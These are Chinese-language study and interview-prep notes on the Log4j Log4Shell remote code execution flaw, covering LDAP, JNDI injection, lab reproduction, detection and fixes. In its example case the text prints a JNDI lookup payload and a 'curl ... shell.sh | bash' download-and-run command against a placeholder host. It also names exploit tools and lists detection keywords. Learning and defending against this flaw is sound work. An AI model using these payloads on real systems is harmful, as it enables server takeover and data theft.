[[log4j-RCE漏洞-笔记.pdf]]


面试：
你可以这样口头描述：

---

**漏洞概述**：  
“Log4j RCE漏洞（CVE-2021-44228，俗称Log4Shell）是Log4j日志框架中的一个远程代码执行漏洞。当应用使用存在漏洞的Log4j版本（≤2.14.1）记录用户输入时，攻击者可以通过构造特殊的恶意字符串（例如`${jndi:ldap://攻击者服务器/恶意类}`），触发Log4j的JNDI解析功能，远程加载并执行攻击者服务器上的恶意代码，最终完全控制目标服务器。”

---

**攻击原理**：

1. **漏洞根源**：Log4j默认支持通过`${}`语法解析动态内容，且未对JNDI（Java命名和目录接口）的远程资源加载做安全限制。
    
2. **利用链**：攻击者提交包含`jndi:ldap/rmi`协议的恶意输入（如HTTP请求头、表单参数等）→ 应用使用Log4j记录该输入 → Log4j解析并请求攻击者控制的LDAP服务器 → 服务器返回指向恶意Java类的地址 → 目标服务器加载并执行该类的代码。
    

---

**核心危害**：

- **影响广泛**：几乎所有依赖Log4j记录用户输入的Java应用（如Web服务、云平台、企业内部系统）均可能被攻击。
    
- **后果严重**：攻击者可直接获取服务器权限、窃取敏感数据、植入后门或横向渗透内网。
    
- **利用门槛低**：漏洞利用简单，甚至通过普通HTTP请求即可触发。
    

---

**修复方案**：

1. **紧急修复**：升级Log4j到安全版本（≥2.15.0），官方后续还提供了2.16.0（禁用JNDI）、2.17.0等版本。
    
2. **临时缓解**：
    
    - 设置JVM参数：`-Dlog4j2.formatMsgNoLookups=true`
        
    - 删除Log4j中`JndiLookup`类文件（手动禁用JNDI功能）。
        
3. **长期防御**：
    
    - 对用户输入的关键字段（如Header、参数）进行字符过滤（如禁止`${`、`jndi:`等关键字）。
        
    - 部署WAF规则拦截JNDI特征请求。
        

---

**补充案例（增强理解）**：  
“例如，攻击者在一个网站的搜索框输入`${jndi:ldap://x.x.x.x/Exploit}`，如果网站用漏洞版本的Log4j记录了搜索关键词，就会触发漏洞。攻击者可以通过LDAP服务器下发恶意类，在目标服务器上执行`curl http://x.x.x.x/shell.sh | bash`这样的命令，直接拿到服务器控制权。”

---

**表达技巧**：

- 先概括漏洞本质（**远程代码执行**），再分步骤解释技术原理，最后用案例辅助理解。
    
- 重点突出漏洞的**广泛性**和**危害性**（面试官通常关注这两点）。
    
- 提到修复方案时，区分**紧急处置**和**长期防护**，体现系统性思维。


# Log4j RCE 漏洞原理笔记

## Log4j 介绍与漏洞影响

### 什么是 Log4j
- Apache 的开源日志组件
- 记录日志的作用：
  1. 对程序的运行进行调试跟踪
  2. 对业务操作进行记录，方便追溯

### 用法
4. pom 引入依赖
5. 获得 logger 实例
6. 使用 `logger.info()`, `debug()`, `error()`, `warn()` 等方法记录日志

### 为什么要用 Log4j
7. 日志级别管理（如生产环境只打印 info 日志，不打印 debug 日志）
8. 不同 package 的打印格式不同
9. 多输出渠道（控制台、文件、数据库）
10. 日志文件管理（文件大小、定时自动清理）
11. 易于集成（Spring、Spring Boot）

### Log4j 漏洞时间线
12. 11 月 24 日，阿里云安全团队陈兆军报告 Log4j RCE 漏洞
13. 12 月 4 日开始有在野攻击
14. 12 月 10 日凌晨漏洞细节被公开
15. 各 SRC 陆续关闭 Log4j 漏洞提交通道
16. 各安全厂商纷纷通报，发布临时解决办法
17. Apache 陆续发布 rc1 补丁、rc2 补丁、2.15 正式版

### 受影响公司
- 绝大部分互联网公司

## 什么是 LDAP

### 定义
- **LIGHTWEIGHT DIRECTORY ACCESS Protocol**（轻量级目录访问协议）
- 简称：目录服务

### 目录服务（例子）
- 小镇的电话簿
- 马云中国黄页

### 计算机如何提供目录服务？
- LDAP
- 目录数据库

### 用途
- 统一登录
- OA 系统
- 邮箱服务器
- Git 服务器
- VPN

### 厂商实现
- SUN: SUNONE Directory Server
- IBM: IBM Directory Server
- Novell: Novell Directory Server
- Microsoft: Microsoft Active Directory
- Opensource: Opensource

### 操作
- 查询、添加、修改、删除

### Java 代码演示
- `LDAPSeriServer`
	 UnboundID` 依赖
	- 监听 7389 端口
	- 添加了一条数据
- `LDAPClient`
	- `Context` 对象
	 `lookup` 方法查找数据

## 什么是 JNDI？

### 定义
- **Java Naming and Directory Interface**（Java 命名和目录接口）
- 简称：命名服务

### JDBC 的不足
- 不便于维护

### 操作
18. 先去公布资源（`bind` 方法）
19. 然后别人可以用名字查找资源（`lookup` 方法）

### 改造 JDBC
```java
Object datasourceRef = ctx.lookup("java:jdbc/mydatasource");
```

### Spring Boot 配置
```properties
spring.datasource.jndi-name=jdbc/exampleDB
```

### JNDI 的作用
![[Pasted image 20250210170306.png]]
### 关系
- 用 JNDI 接口访问 LDAP 服务，或者 RMI（远程方法调用服务）

### 代码演示
- 服务端：`LDAPSeriServer.java`
- 客户端：`JNDIClient.java`
- 关键函数：`lookup`

## JNDI 注入

### 1. JNDI 动态协议转换
- 即使初始化的 `Context` 指定了一个协议，也会根据 URI 传入的参数来转换协议
- 例如：`Context` 初始化是 RMI 服务，但 `lookup` 的参数是 LDAP 服务，此时协议会动态转换

### 2. Naming Reference（命名引用）
20. 不在命名/目录服务本地的一个资源，叫做命名引用
21. 让 JNDI 去请求一个不存在的资源
22. 当 JNDI 客户端在本地 `classpath` 找不到这个类，就去指定的远程地址请求，下载这个类到本地执行    
23. 示例
24. `Exploit` 定义静态方法块

### 流程
![[Pasted image 20250210170540.png]]

### 为什么会执行远程代码？
#### NamingManager 341行
![[Pasted image 20250210170719.png]]
#### etObjectFactoryFrom..
![[Pasted image 20250210170758.png]]

### RMI资源也可以这样利用，原理一样
#### 怎么在外网启动一个LDAP服务？
	除了本地Java代码，也可以用marshalsec-0.0. 3-SNAPSHOT-all.jar，带参数直接启动
#### 怎么在外网启动一个HTTP服务？ Apache
	Apache、Tomcat、Nginx、Phpstudy……
## 环境复现

### 基础环境
- 开发工具：IDEA
- JDK：JDK 1.8u121 以下的版本
- Maven：例如 3.6.3

### 1. 准备远程代码
- `Exploit.java`
- 编译：`javac Exploit.java`
- 上传到 HTTP 服务器（Apache、Python SimpleHTTPServer 等）

### 2. 准备 LDAP 服务器
25. `LDAPRefServer.java`
26. Maven 依赖：`unboundid-ldapsdk`
27. 配置远程代码的 HTTP URL
28. 启动服务，绑定指定端口

### 3. LDAP 客户端（Log4j）
29. Maven 依赖：2.14.1 版本
30. Apache Log4j 2.x <= 2.14.1
31. 打印日志即可，客户端即下载恶意代码并执行
### 4.
![[Pasted image 20250210171811.png]]

## Log4j RCE 原理分析
32. Log4j 支持 JNDI `lookup` 功能
33. `StrSubstitutor` 的 `resolveVariable()` 方法
34. `NamingManager` 的 `newInstance` 方法

## 漏洞影响范围
- Log4j 2.x <= 2.14.1
- JDK 小于 8u191、7u201、6u211

## 漏洞排查
35. pom 版本检查
36. 日志中是否存在 `jndi:ldap://`、`jndi:rmi`、`dnslog.cn`、`ceye.io` 等
37. 是否存在 `JndiLookup`、`ldapURLContext`、`getObjectFactoryFromReference` 调用

### 工具
- [log4j-local-check.sh](https://static.threatbook.cn/tools/log4j-local-check.sh)
- [allScanner.zip](https://sca.seczone.cn/allScanner.zip)

## 漏洞修复

### 思路
38. 禁止用户请求参数出现攻击关键字
39. 禁止 `lookup` 下载远程文件（命名引用）
40. 禁止 Log4j 的应用连接外网
41. 禁止 Log4j 使用 `lookup`
42. 从 Log4j jar 包中删除 `lookup`（2.10 以下）

### 升级到 2.17.1-原理
43. 默认不再支持二次跳转（命名引用）的方式获取对象
44. 只有在 `log4j2.allowedLdapClasses` 列表中指定的 class 才能获取
45. 只有远程地址是本地地址或者在 `log4j2.allowedLdapHosts` 列表中指定的地址才能获取

### 其他方案
#### - 升级 JDK
  1. JDK 6u45、7u21 之后：`java.rmi.server.useCodebaseOnly` 默认值为 `true`，禁用自动加载远程类文件
  2. JDK 6u141、7u131、8u121 之后：`com.sun.jndi.rmi.object.trustURLCodebase` 默认为 `false`，禁止 RMI 和 CORBA 协议使用远程 codebase
  3. JDK 6u211、7u201、8u191 之后：`com.sun.jndi.ldap.object.trustURLCodebase` 默认为 `false`，禁止 LDAP 协议使用远程 codebase

### 修改 Log4j 配置
46. 设置参数：`log4j2.formatMsgNoLookups=True`
47. 修改 JVM 参数：`-Dlog4j2.formatMsgNoLookups=true`
48. 系统环境变量：`FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS` 设置为 `true`
49. 禁止 Log4j2 所在服务器外连



### 任意命令执行
- 前端注入点：只要是参数被 Log4j 记录的地方都可以
- 现成利用工具：`log4j_POC.jar`
